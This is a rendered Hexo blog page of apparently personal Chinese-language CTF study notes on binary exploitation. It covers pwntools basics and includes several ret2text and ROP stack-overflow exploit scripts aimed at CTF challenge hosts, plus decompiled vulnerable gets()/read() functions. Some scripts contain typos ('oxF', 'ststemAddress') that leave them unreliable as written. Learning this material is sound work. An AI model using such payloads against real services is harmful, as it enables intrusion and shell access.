@@ -1,0 +1,982 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      pwn | yzzob_blog
+    
+  </title>
+  <meta name="author" content="yzz">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'normal',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 110,
+      randomYouSrc: 'https://sariay.github.io/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「pwn」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-zhihu"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-sina-weibo "></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-pinterest2"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/05/22/pwn/" itemprop="url">
+		pwn
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/05/22/pwn/" itemprop="url">
+		<time datetime="2024-05-22T09:50:44.879Z" itemprop="dateUpdated">
+	  		2024-04-18
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+						
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1><span id="pwn">pwn</span></h1><h2><span id="参考链接">参考链接</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_45004513/article/details/117332121</span><br></pre></td></tr></table></figure>
+
+<h2><span id="简易快速入门">简易快速入门</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">导入Pwntools</span><br><span class="line">from pwn import *</span><br><span class="line">链接</span><br><span class="line">r = remote(&quot;目标地址str类型&quot;, 目标端口int类型)与服务器交互</span><br><span class="line">r = process(&quot;目标程序位置&quot;)与本地程序交互</span><br><span class="line">构造playload之打包</span><br><span class="line">p64(int)将int类型打包成64位存储</span><br><span class="line">p32(int)将int类型打包成32位存储</span><br><span class="line">发送</span><br><span class="line">r.sendline(playload)发送playload为一行（自动在尾部加上\n）</span><br><span class="line">接收</span><br><span class="line">r.recv()接收到结束</span><br><span class="line">r.recvuntil(end, drop=True)end(str)接受到end之后截至，drop=True时不包括end，drop=False时包括end</span><br><span class="line">打开交互</span><br><span class="line">r.interactive()一般在末尾都要加</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>原文链接：<a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">https://blog.csdn.net/weixin_45004513/article/details/117332121</a></p>
+<h2><span id="getscanary">gets;canary</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main函数中存在gets(无限读入字符串漏洞)，没有开canary可以自由栈溢出</span><br></pre></td></tr></table></figure>
+
+<h2><span id="可执行文件">可执行文件</span></h2><p><img src="/../img/image-20240418150721875.png" alt="image-20240418150721875"></p>
+<h2><span id="寄存器">寄存器</span></h2><p><img src="/../img/image-20240418151107321.png" alt="image-20240418151107321"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RIP: Return Instruction Pointer</span><br><span class="line">RBP: Register Base Pointer</span><br><span class="line">RSP: Register Stack Pointer</span><br><span class="line">RAX: Register Accumulator</span><br><span class="line">ebp 4</span><br><span class="line">rbp 8</span><br><span class="line">真正的函数在got表里面</span><br><span class="line">1,溢出点</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2><span id="汇编简介">汇编简介</span></h2><p><img src="/../img/image-20240418151219231.png" alt="image-20240418151219231"></p>
+<p><img src="/../img/image-20240418151238310.png" alt="image-20240418151238310"></p>
+<p><img src="/../img/image-20240418151300260.png" alt="image-20240418151300260"></p>
+<h2><span id="查看保护进制">查看保护进制</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">r&quot;D:\yzzob\Desktop\service&quot;</span>)</span><br><span class="line"><span class="comment"># 查看保护机制</span></span><br><span class="line">elf.checksec()</span><br><span class="line"></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line"><span class="number">64</span>位程序</span><br></pre></td></tr></table></figure>
+
+<h2><span id="简单的python攻击程序">简单的python攻击程序</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看几位程序和保护机制</span><br><span class="line">check 附件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system,b是以二进制的方式,int16是4位,13是数组长度</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span>+p32(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#64位程序,要得到system即fun的首地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(oxF)+p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line"><span class="comment">#-1视为无穷大</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x4006E6</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line"><span class="comment">#填充字符,拼接system和bin/sh获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(ststemAddress)+p32(<span class="number">0x0</span>)+p32(shellAddress)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>获取寄存器地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|rdi|ret&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line">rdi=<span class="number">0x400683</span></span><br><span class="line"><span class="comment">#填充字符,拼接system和bin/sh获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(rdi)+p64(ststemAddress)+p64(shellAddress)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2><span id="payload构造">payload构造</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.get(),read(),scanf()为溢出的切入口</span><br><span class="line">2.查看system()地址</span><br><span class="line">	a.start后面的内容</span><br><span class="line">	b.push地址</span><br><span class="line">3.装满后64&gt;8,32&gt;4</span><br><span class="line">4.栈溢出的功能:</span><br><span class="line">	a.获取到system()</span><br><span class="line">	b.改变变量的值</span><br></pre></td></tr></table></figure>
+
+<h2><span id="常用变换">常用变换</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">汇编&gt;&gt;图形化界面</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/image-20240418205103602.png" alt="image-20240418205103602"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图形化界面&gt;&gt;汇编</span><br></pre></td></tr></table></figure>
+
+<p>space</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图形化界面&gt;&gt;伪代码</span><br></pre></td></tr></table></figure>
+
+<p>f5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;16进制--h</span><br><span class="line">改名字--n</span><br></pre></td></tr></table></figure>
+
+
+
+<h1><span id="例题">例题</span></h1><h2><span id="2022zjnubaby_rop">2022zjnubaby_rop</span></h2><p>[<a href="https://ctf.a1natas.com/games/1/challenges">复现] 2022 第二届浙江师范大学网络与信息安全竞赛 - A1::CTF (a1natas.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器,64位程序</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x401196</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text栈溢出">ret2text;栈溢出</span></h2><p>return to text</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(r&quot;D:\yzzob\Desktop\有手就行的栈溢出\pwn&quot;)</span><br><span class="line">elf.checksec()</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">url = &quot;node5.anna.nssctf.cn:28459&quot;</span><br><span class="line">tmp = url.split(&#x27;:&#x27;)</span><br><span class="line">host = tmp[0]</span><br><span class="line">post = int(tmp[1])</span><br><span class="line">p = remote(host, post)</span><br><span class="line"></span><br><span class="line">backdoor = 0x401257</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20+8) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text栈溢出">ret2text;栈溢出</span></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">NSS</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text栈溢出">ret2text;栈溢出</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_host_post</span>(<span class="params">url</span>):</span><br><span class="line">    tmp_ = url.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    host_ = tmp_[<span class="number">0</span>]</span><br><span class="line">    post_ = <span class="built_in">int</span>(tmp_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> host_,post_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(r&quot;D:\yzzob\Desktop\r3m4ke1t&quot;)</span></span><br><span class="line"><span class="comment"># elf.checksec()</span></span><br><span class="line">url = <span class="string">&quot;node4.anna.nssctf.cn:28718&quot;</span></span><br><span class="line">backdoor = <span class="number">0x40072C</span></span><br><span class="line"><span class="comment"># ret_addr = 0x40101als</span></span><br><span class="line">bp = <span class="number">64</span></span><br><span class="line">long = <span class="number">0x20</span></span><br><span class="line"><span class="comment"># p = process(r&quot;D:\yzzob\Desktop\trop&quot;)</span></span><br><span class="line">host , post = get_host_post(url)</span><br><span class="line">p = remote(host, post)</span><br><span class="line"><span class="keyword">if</span> bp == <span class="number">64</span>:</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(long+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line">    <span class="comment"># payload = b&#x27;a&#x27;*long+ p64(ret_addr) + p64(backdoor)</span></span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;chance!&quot;, payload)</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(long+<span class="number">4</span>) + p32(backdoor)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text栈溢出">ret2text;栈溢出</span></h2><p>1.gets()</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.&#x2F;bin&#x2F;sh</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007B</span>8 <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D <span class="number">0</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          lea     rdi, command                    ; <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_host_post</span>(<span class="params">url</span>):</span><br><span class="line">    tmp_ = url.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    host_ = tmp_[<span class="number">0</span>]</span><br><span class="line">    post_ = <span class="built_in">int</span>(tmp_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> host_,post_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">r&quot;D:\yzzob\Desktop\609_3196e3239e759420ab20ea573ead008b4491b166\pwn&quot;</span>)</span><br><span class="line">elf.checksec()</span><br><span class="line"><span class="comment"># print_flag = elf.sym[&#x27;print_flag&#x27;]</span></span><br><span class="line">url = <span class="string">&quot;challenge-32753e3830fa650c.sandbox.ctfhub.com:30329&quot;</span></span><br><span class="line">backdoor = <span class="number">0x4007B8</span></span><br><span class="line"><span class="comment"># ret_addr = 0x40101als</span></span><br><span class="line">bp = <span class="number">64</span></span><br><span class="line">long = <span class="number">0x70</span></span><br><span class="line"><span class="comment"># p = process(r&quot;D:\yzzob\Desktop\trop&quot;)</span></span><br><span class="line">host , post = get_host_post(url)</span><br><span class="line">p = remote(host, post)</span><br><span class="line"><span class="keyword">if</span> bp == <span class="number">64</span>:</span><br><span class="line">    <span class="comment"># payload = b&#x27;a&#x27; * (long + 8) + p64(print_flag)</span></span><br><span class="line">    <span class="comment"># payload = b&#x27;a&#x27;*long+ p64(ret_addr) + p64(backdoor)</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (long+<span class="number">8</span>)+ p64(backdoor)</span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;chance!&quot;, payload)</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># p.recvall()</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     payload = b&#x27;a&#x27;*(long+4) + p32(backdoor)</span></span><br><span class="line"><span class="comment">#     p.sendline(payload)</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2><span id="shellcode">shellcode</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0, buf, 0x400uLL);</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ret2text栈溢出">ret2text;栈溢出</span></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
